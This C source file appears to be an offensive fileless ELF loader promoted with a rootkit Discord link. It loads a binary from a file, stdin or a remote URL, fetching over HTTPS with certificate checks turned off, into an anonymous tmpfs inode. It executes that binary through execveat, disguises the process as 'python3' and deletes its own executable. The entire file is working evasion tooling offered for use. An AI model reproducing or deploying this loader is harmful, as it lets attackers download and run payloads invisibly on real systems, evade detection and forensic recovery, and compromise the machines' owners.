/*
@MatheuzSecurity
discord.gg/rootkits

Join :)
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/prctl.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <limits.h>

#ifdef USE_HTTPS
#include <openssl/ssl.h>
#include <openssl/err.h>
#endif

static int sc_open(const char *path, int flags, int mode)
{
    return (int)syscall(SYS_open, path, flags, mode);
}

static ssize_t sc_read(int fd, void *buf, size_t n)
{
    return (ssize_t)syscall(SYS_read, fd, buf, n);
}

static ssize_t sc_write(int fd, const void *buf, size_t n)
{
    return (ssize_t)syscall(SYS_write, fd, buf, n);
}

static int sc_close(int fd)
{
    return (int)syscall(SYS_close, fd);
}

static int sc_unlink(const char *path)
{
    return (int)syscall(SYS_unlink, path);
}

static int sc_execveat(int fd, const char *path,
                       char *const argv[], char *const envp[], int flags)
{
    return (int)syscall(SYS_execveat, fd, path, argv, envp, flags);
}

static const char *anon_dirs[] = {
    "/tmp", "/var/tmp", "/run", NULL
};

static int open_anon_fd(char *used_dir, size_t used_dir_sz)
{
    for (int i = 0; anon_dirs[i]; i++) {
        int fd = sc_open(anon_dirs[i],
                         O_TMPFILE | O_RDWR | O_CLOEXEC, 0700);
        if (fd >= 0) {
            if (used_dir) strncpy(used_dir, anon_dirs[i], used_dir_sz - 1);
            return fd;
        }
    }
    sc_write(2, "[-] No writable tmpfs\n", 22);
    return -1;
}

static int magic_ok(const uint8_t *hdr, size_t len)
{
    return len >= 4 &&
           hdr[0] == 0x7f && hdr[1] == 'E' &&
           hdr[2] == 'L'  && hdr[3] == 'F';
}

static int write_all(int fd, const void *buf, size_t len)
{
    const uint8_t *p = buf;
    size_t rem = len;
    while (rem > 0) {
        ssize_t r = sc_write(fd, p, rem);
        if (r <= 0) return -1;
        p += r; rem -= r;
    }
    return 0;
}

static int load_from_file(int anon_fd, const char *path)
{
    int src = sc_open(path, O_RDONLY, 0);
    if (src < 0) { perror("open"); return -1; }
    uint8_t buf[65536];
    ssize_t r;
    int first = 1;
    while ((r = sc_read(src, buf, sizeof(buf))) > 0) {
        if (first) {
            if (!magic_ok(buf, r)) {
                sc_write(2, "[-] Not ELF\n", 12);
                sc_close(src); return -1;
            }
            first = 0;
        }
        if (write_all(anon_fd, buf, r) < 0) { perror("write"); sc_close(src); return -1; }
    }
    sc_close(src);
    return 0;
}

static int load_from_stdin(int anon_fd)
{
    uint8_t buf[65536];
    ssize_t r;
    int first = 1;
    while ((r = sc_read(0, buf, sizeof(buf))) > 0) {
        if (first) {
            if (!magic_ok(buf, r)) { sc_write(2, "[-] Not ELF\n", 12); return -1; }
            first = 0;
        }
        if (write_all(anon_fd, buf, r) < 0) { perror("write"); return -1; }
    }
    return 0;
}

static int parse_url(const char *url, char *host, size_t hsz,
                     char *path, size_t psz, uint16_t *port, int *tls)
{
    const char *p;
    if (strncmp(url, "https://", 8) == 0) { *tls = 1; *port = 443; p = url + 8; }
    else if (strncmp(url, "http://", 7) == 0) { *tls = 0; *port = 80;  p = url + 7; }
    else { sc_write(2, "[-] Only http:// or https://\n", 29); return -1; }

    const char *slash = strchr(p, '/');
    size_t hlen = slash ? (size_t)(slash - p) : strlen(p);
    if (hlen >= hsz) return -1;
    memcpy(host, p, hlen); host[hlen] = 0;

    char *colon = strchr(host, ':');
    if (colon) { *port = (uint16_t)atoi(colon + 1); *colon = 0; }

    strncpy(path, slash ? slash : "/", psz - 1);
    return 0;
}

static int tcp_connect(const char *host, uint16_t port)
{
    struct addrinfo hints = {0}, *res = NULL;
    char ps[8]; snprintf(ps, sizeof(ps), "%u", port);
    hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM;
    if (getaddrinfo(host, ps, &hints, &res) != 0) {
        sc_write(2, "[-] DNS failed\n", 15); return -1;
    }
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0 || connect(sock, res->ai_addr, res->ai_addrlen) < 0) {
        perror("connect"); freeaddrinfo(res); return -1;
    }
    freeaddrinfo(res);
    return sock;
}

static int drain_http_body(int anon_fd,
                           ssize_t (*readfn)(void *, uint8_t *, size_t),
                           void *ctx)
{
    uint8_t buf[65536];
    uint8_t hdrbuf[8192]; size_t hdrlen = 0;
    int in_hdr = 1, first = 1;
    ssize_t r;

    while ((r = readfn(ctx, buf, sizeof(buf))) > 0) {
        if (in_hdr) {
            size_t copy = (size_t)r;
            if (hdrlen + copy > sizeof(hdrbuf)) copy = sizeof(hdrbuf) - hdrlen;
            memcpy(hdrbuf + hdrlen, buf, copy);
            hdrlen += copy;
            char *sep = memmem(hdrbuf, hdrlen, "\r\n\r\n", 4);
            if (sep) {
                in_hdr = 0;
                if (strncmp((char *)hdrbuf, "HTTP/", 5) == 0 && atoi((char *)hdrbuf + 9) != 200) {
                    sc_write(2, "[-] HTTP error\n", 15); return -1;
                }
                uint8_t *body = (uint8_t *)(sep + 4);
                size_t blen  = hdrlen - (size_t)(body - hdrbuf);
                size_t extra = (size_t)r - copy;
                if (blen > 0) {
                    if (first) { if (!magic_ok(body, blen)) return -1; first = 0; }
                    write_all(anon_fd, body, blen);
                }
                if (extra > 0) {
                    uint8_t *e = buf + copy;
                    if (first) { if (!magic_ok(e, extra)) return -1; first = 0; }
                    write_all(anon_fd, e, extra);
                }
            }
        } else {
            if (first) { if (!magic_ok(buf, r)) return -1; first = 0; }
            write_all(anon_fd, buf, r);
        }
    }
    return 0;
}

static ssize_t plain_read(void *ctx, uint8_t *buf, size_t n)
{
    return sc_read(*(int *)ctx, buf, n);
}

#ifdef USE_HTTPS
static ssize_t ssl_read(void *ctx, uint8_t *buf, size_t n)
{
    return (ssize_t)SSL_read((SSL *)ctx, buf, (int)n);
}
#endif

static int load_from_http(int anon_fd, const char *url)
{
    char host[256], path[4096];
    uint16_t port; int tls;
    if (parse_url(url, host, sizeof(host), path, sizeof(path), &port, &tls) < 0)
        return -1;

#ifndef USE_HTTPS
    if (tls) { sc_write(2, "https not supported\n", 20); return -1; }
#endif

    int sock = tcp_connect(host, port);
    if (sock < 0) return -1;

    char req[8192];
    int rlen = snprintf(req, sizeof(req),
        "GET %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host);

    int rc = -1;

#ifdef USE_HTTPS
    if (tls) {
        SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
        if (!ctx) { sc_close(sock); return -1; }
        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
        SSL *ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sock);
        SSL_set_tlsext_host_name(ssl, host);
        if (SSL_connect(ssl) != 1) {
            ERR_print_errors_fp(stderr);
            SSL_free(ssl); SSL_CTX_free(ctx); sc_close(sock); return -1;
        }
        SSL_write(ssl, req, rlen);
        rc = drain_http_body(anon_fd, ssl_read, ssl);
        SSL_shutdown(ssl); SSL_free(ssl); SSL_CTX_free(ctx);
    } else {
#endif
        if (write_all(sock, req, rlen) < 0) { sc_close(sock); return -1; }
        rc = drain_http_body(anon_fd, plain_read, &sock);
#ifdef USE_HTTPS
    }
#endif

    sc_close(sock);
    return rc;
}

static void exec_anon(int anon_fd, char *const argv[], char *const envp[],
                      const char *spoof_name)
{
    char fdpath[64];
    snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", anon_fd);
    int ro_fd = sc_open(fdpath, O_RDONLY | O_CLOEXEC, 0);
    if (ro_fd < 0) { perror("reopen ro"); return; }
    sc_close(anon_fd);

    if (spoof_name)
        prctl(PR_SET_NAME, spoof_name, 0, 0, 0);

    char self_path[PATH_MAX] = {0};
    ssize_t n = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (n > 0) sc_unlink(self_path);

    sc_execveat(ro_fd, "", argv, envp, AT_EMPTY_PATH);
    perror("execveat");
}

static void usage(const char *me)
{
    dprintf(2,
        "Usage:\n"
        "  %s file  <elf> [spoof_name] [args...]\n"
        "  %s http  <url> [spoof_name] [args...]\n"
        "  %s stdin [spoof_name]\n"
        "\nspoof_name: argv[0] the exec'd process will show (default: 'python3')\n",
        me, me, me);
    exit(1);
}

extern char **environ;

int main(int argc, char *argv[])
{
    if (argc < 2) usage(argv[0]);

    const char *mode = argv[1];

    char used_dir[64] = {0};
    int anon_fd = open_anon_fd(used_dir, sizeof(used_dir));
    if (anon_fd < 0) return 1;

    dprintf(2, "[*] Anon inode on %s (fd=%d)\n", used_dir, anon_fd);

    int rc = -1;

    if (strcmp(mode, "file") == 0) {
        if (argc < 3) usage(argv[0]);
        rc = load_from_file(anon_fd, argv[2]);
        if (rc == 0) {
            const char *spoof = argc > 3 ? argv[3] : "python3";
            int nargs = argc > 4 ? argc - 4 : 0;
            char **ea = calloc(nargs + 2, sizeof(char *));
            ea[0] = (char *)spoof;
            for (int i = 0; i < nargs; i++) ea[i + 1] = argv[4 + i];
            exec_anon(anon_fd, ea, environ, spoof);
        }

    } else if (strcmp(mode, "stdin") == 0) {
        rc = load_from_stdin(anon_fd);
        if (rc == 0) {
            const char *spoof = argc > 2 ? argv[2] : "python3";
            char *ea[] = {(char *)spoof, NULL};
            exec_anon(anon_fd, ea, environ, spoof);
        }

    } else if (strcmp(mode, "http") == 0) {
        if (argc < 3) usage(argv[0]);
        rc = load_from_http(anon_fd, argv[2]);
        if (rc == 0) {
            const char *spoof = argc > 3 ? argv[3] : "python3";
            char *ea[] = {(char *)spoof, NULL};
            exec_anon(anon_fd, ea, environ, spoof);
        }

    } else {
        usage(argv[0]);
    }

    sc_close(anon_fd);
    return rc == 0 ? 0 : 1;
}
